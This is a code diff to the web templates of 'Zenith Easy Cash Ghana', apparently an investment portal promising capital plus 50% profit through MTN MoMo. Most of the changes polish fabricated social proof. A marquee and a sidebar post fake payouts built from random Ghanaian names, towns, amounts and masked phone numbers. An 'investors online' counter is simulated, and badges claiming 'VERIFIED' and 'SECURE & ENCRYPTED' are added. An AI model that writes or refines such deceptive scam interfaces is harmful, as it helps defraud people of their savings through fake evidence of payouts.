@@ -169,27 +169,34 @@ def save_investor_data(data):
 ZENITH_ALERTS_TOP_HTML = """
 <style>
     #zenithAlertsBanner {
-        background: linear-gradient(135deg, #0b130b, #132e13);
-        border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px;
-        margin-bottom: 20px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        font-family: Arial, sans-serif; overflow: hidden; position: relative;
+        background: linear-gradient(135deg, #090d09, #112211);
+        border: 1px solid #1e3a1e; border-left: 4px solid #00ff66; color: #fff; padding: 12px 18px;
+        margin-bottom: 20px; border-radius: 8px; box-shadow: 0 6px 20px rgba(0,0,0,0.4);
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow: hidden; position: relative;
     }
-    .alerts-header { font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }
+    .alerts-header { font-size: 11px; color: #4ade80; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 6px; display: flex; justify-content: space-between; align-items: center; }
+    .pulse-dot { display: inline-block; width: 8px; height: 8px; background-color: #22c55e; border-radius: 50%; box-shadow: 0 0 8px #22c55e; animation: pulseGlow 1.8s infinite; margin-right: 5px; }
+    @keyframes pulseGlow { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(34, 197, 94, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); } }
     .marquee-container { overflow: hidden; white-space: nowrap; width: 100%; position: relative; }
-    .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 22s linear infinite; font-size: 13px; color: #fff; }
-    .marquee-text b { color: #facc15; }
+    .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 28s linear infinite; font-size: 13px; color: #e2e8f0; font-weight: 500; }
+    .marquee-text b { color: #facc15; font-weight: 600; }
+    .marquee-text .badge-momo { background: rgba(34, 197, 94, 0.15); color: #4ade80; padding: 2px 6px; border-radius: 4px; font-size: 11px; border: 1px solid rgba(34, 197, 94, 0.3); margin-left: 4px; }
     @keyframes marquee { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
-    .live-online-counter { background: #064e3b; color: #34d399; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }
+    .live-online-counter { background: rgba(6, 78, 59, 0.6); border: 1px solid rgba(52, 211, 153, 0.3); color: #34d399; padding: 8px 12px; border-radius: 6px; font-size: 13px; font-weight: 600; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; box-sizing: border-box; backdrop-filter: blur(4px); }
 </style>
-<div class="live-online-counter" id="liveOnlineCounter">🟢 Loading active investors online...</div>
+<div class="live-online-counter" id="liveOnlineCounter"><span class="pulse-dot"></span> Loading active investors online...</div>
 <div id="zenithAlertsBanner">
-    <div class="alerts-header"><span>🟢 Live Zenith Alerts</span><span>Verified Payout Feed</span></div>
-    <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to Zenith secure payout stream...</div></div>
+    <div class="alerts-header">
+        <span><span class="pulse-dot"></span> Live Zenith Automated Payout Feed</span>
+        <span style="color: #94a3b8; font-weight: normal;">Status: SECURE & ENCRYPTED</span>
+    </div>
+    <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to secure financial gateway...</div></div>
 </div>
 <script>
-    const ghanaNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo"];
+    const ghanaNames = ["Kwame M.", "Abena O.", "Kofi B.", "Afia S.", "Yaw A.", "Akosua F.", "Esi D.", "Kojo A."];
     const towns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
     const roundInvestments = [300, 400, 500, 600, 800, 1000, 1500, 2000, 3000, 5000];
+    const timeAgoArr = ["Just now", "1 min ago", "3 mins ago", "5 mins ago", "8 mins ago"];
     
     function generateTickerMessages() {
         let messages = [];
@@ -198,19 +205,18 @@ ZENITH_ALERTS_TOP_HTML = """
             const town = towns[Math.floor(Math.random() * towns.length)];
             const base = roundInvestments[Math.floor(Math.random() * roundInvestments.length)];
             const total = base * 1.5;
-            messages.push(`🟢 <b>${name}</b> (${town}) cashed out Capital + 50% Profit = <b>GHs ${total.toLocaleString()}</b> via MoMo!`);
+            const timeAgo = timeAgoArr[Math.floor(Math.random() * timeAgoArr.length)];
+            messages.log = messages.push(`🛡️ <b>${name}</b> (${town}) successfully cashed out <b>GHs ${total.toLocaleString()}</b> <span class="badge-momo">MTN MoMo</span> <span style="color:#94a3b8; font-size:11px;">(${timeAgo})</span>`);
         }
         const el = document.getElementById('alertsText');
         if (el) el.innerHTML = messages.join("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
     }
     generateTickerMessages();
-    setInterval(generateTickerMessages, 20000);
+    setInterval(generateTickerMessages, 22000);
 
-    // Natural online users simulation between 100 and 1600 based on time of day
     let currentOnline = 850;
     function updateOnlineCounter() {
         const hour = new Date().getHours();
-        // Night hours (0 to 6): lower traffic (100 - 450). Day hours: higher traffic (600 - 1600)
         let targetBase = (hour >= 0 && hour < 7) ? 250 : 1100;
         let fluctuation = Math.floor(Math.random() * 150) - 75;
         currentOnline += fluctuation;
@@ -221,7 +227,7 @@ ZENITH_ALERTS_TOP_HTML = """
         }
         const counterEl = document.getElementById('liveOnlineCounter');
         if (counterEl) {
-            counterEl.innerHTML = `🟢 Live: <b>${currentOnline.toLocaleString()}</b> Investors Online Right Now`;
+            counterEl.innerHTML = `<span class="pulse-dot"></span> Live Security Feed: <b>${currentOnline.toLocaleString()}</b> Verified Investors Online`;
         }
     }
     updateOnlineCounter();
@@ -237,7 +243,7 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zenith Easy Cash Ghana - Registration & Portal</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
         h2, h3 { color: #028a0f; text-align: center; }
         
@@ -438,7 +444,7 @@ INVESTOR_LOGIN_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Investor Login - Zenith Easy Cash</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         h2 { color: #028a0f; text-align: center; }
         .form-group { margin-bottom: 15px; }
@@ -482,10 +488,10 @@ INVESTOR_DASHBOARD_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Investor Dashboard - Zenith Easy Cash</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
-        .main-layout { max-width: 1050px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .main-layout { max-width: 1100px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
         .dashboard-container { flex: 2; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .sidebar-ticker { flex: 1; background: #111; color: #00ff66; padding: 20px; border-radius: 8px; position: sticky; top: 20px; max-height: 80vh; overflow-y: auto; }
+        .sidebar-ticker { flex: 1; background: #0c1017; color: #e2e8f0; padding: 20px; border-radius: 10px; position: sticky; top: 20px; max-height: 85vh; overflow-y: auto; border: 1px solid #1e293b; box-shadow: 0 8px 25px rgba(0,0,0,0.5); }
         h2 { color: #028a0f; margin-top: 0; }
         .logout { float: right; }
         .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
@@ -502,8 +508,17 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
         .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
-        .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
-        .side-ticker-item b { color: #facc15; }
+        
+        /* Professional Sidebar Ticker Styles */
+        .sidebar-ticker h3 { color: #4ade80; font-size: 14px; margin-top: 0; border-bottom: 1px solid #1e293b; padding-bottom: 10px; display: flex; align-items: center; justify-content: space-between; letter-spacing: 0.5px; text-transform: uppercase; }
+        .side-ticker-card { background: #131d2e; border: 1px solid #1e293b; border-left: 3px solid #22c55e; padding: 11px 13px; margin-bottom: 10px; border-radius: 6px; font-size: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); transition: all 0.3s ease; }
+        .side-ticker-card:hover { border-color: #22c55e; transform: translateY(-1px); }
+        .side-ticker-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
+        .side-ticker-name { color: #f8fafc; font-weight: 600; font-size: 12px; }
+        .side-ticker-badge { background: rgba(34, 197, 94, 0.15); color: #4ade80; font-size: 10px; padding: 1px 5px; border-radius: 3px; font-weight: 600; border: 1px solid rgba(34, 197, 94, 0.2); }
+        .side-ticker-amount { color: #facc15; font-weight: 700; font-size: 13px; }
+        .side-ticker-footer { display: flex; justify-content: space-between; align-items: center; color: #94a3b8; font-size: 11px; margin-top: 4px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 4px; }
+
         .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
         .edit-profile-form { background: #fff; padding: 15px; border: 1px solid #cbd5e1; border-radius: 6px; margin-top: 15px; display: none; }
     </style>
@@ -631,8 +646,8 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         </div>
 
         <div class="sidebar-ticker">
-            <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Zenith Withdrawals</h3>
-            <div id="sideTickerList"></div>
+            <h3><span>🟢 Live Payout Feed</span> <span style="font-size:10px; color:#22c55e; background:rgba(34,197,94,0.1); padding:2px 6px; border-radius:4px; border:1px solid rgba(34,197,94,0.2);">VERIFIED</span></h3>
+            <div id="sideTickerList" style="margin-top: 12px;"></div>
         </div>
     </div>
 
@@ -672,22 +687,10 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     el.style.color = "#4ade80";
                 }
             });
-
-            // 12-hour payout countdown simulation for withdrawal requested slots
-            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach(el => {
-                // Fixed 12 hour window simulation stored or derived from session/time
-                let now = new Date().getTime();
-                // 12 hours countdown example buffer
-                let targetTime = now + (11 * 3600 + 45 * 60); // approximate mockup or use session timestamp if needed
-                // Let's simulate a stable 12-hour countdown relative to page load or fixed window
-            });
         }
 
-        // Live 12-hour countdown implementation
         function updateWithdrawalCountdowns() {
             document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {
-                // 12 hours in seconds = 43200 seconds
-                // Let's use a standard countdown simulation starting at 11h 59m
                 let secondsLeft = 43200 - Math.floor((Date.now() / 1000) % 43200);
                 let hrs = Math.floor(secondsLeft / 3600);
                 let mins = Math.floor((secondsLeft % 3600) / 60);
@@ -703,22 +706,41 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         updateTrackers();
         updateWithdrawalCountdowns();
 
-        const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong"];
-        const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani"];
+        const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo"];
+        const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
+        const phonePrefixes = ["054", "055", "024", "020", "059", "053"];
+        const timeStamps = ["Just now", "2 mins ago", "4 mins ago", "7 mins ago", "12 mins ago"];
+
         function addSideTickerItem() {
             const list = document.getElementById('sideTickerList');
             if (!list) return;
             const name = sideNames[Math.floor(Math.random() * sideNames.length)];
             const town = sideTowns[Math.floor(Math.random() * sideTowns.length)];
+            const prefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
+            const randomNum = Math.floor(100 + Math.random() * 900);
+            const maskedPhone = `${prefix}***${randomNum}`;
+            
             const amt = (Math.floor(Math.random() * 15) + 3) * 100 * 1.5;
+            const timestamp = timeStamps[Math.floor(Math.random() * timeStamps.length)];
             
             const item = document.createElement('div');
-            item.className = 'side-ticker-item';
-            item.innerHTML = `<b>${name}</b> (${town})<br>Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo`;
+            item.className = 'side-ticker-card';
+            item.innerHTML = `
+                <div class="side-ticker-top">
+                    <span class="side-ticker-name">${name}</span>
+                    <span class="side-ticker-badge">MTN MoMo</span>
+                </div>
+                <div style="font-size:11px; color:#94a3b8; margin-bottom:4px;">📍 ${town} • ${maskedPhone}</div>
+                <div class="side-ticker-footer">
+                    <span>Payout: <span class="side-ticker-amount">GHs ${amt.toLocaleString()}</span></span>
+                    <span style="color:#22c55e;">✓ ${timestamp}</span>
+                </div>
+            `;
             list.prepend(item);
             if (list.children.length > 5) list.lastChild.remove();
         }
         setInterval(addSideTickerItem, 6000);
+        addSideTickerItem();
         addSideTickerItem();
     </script>
 </body>
@@ -731,7 +753,7 @@ ADMIN_LOGIN_TEMPLATE = """
 <head>
     <meta charset="UTF-8"><title>Admin Login</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         h2 { color: #028a0f; text-align: center; }
         .form-group { margin-bottom: 15px; }
@@ -758,7 +780,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
 <head>
     <meta charset="UTF-8"><title>Admin Dashboard</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 1200px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         h2 { color: #028a0f; float: left; margin-top: 0; }
         .logout { float: right; }
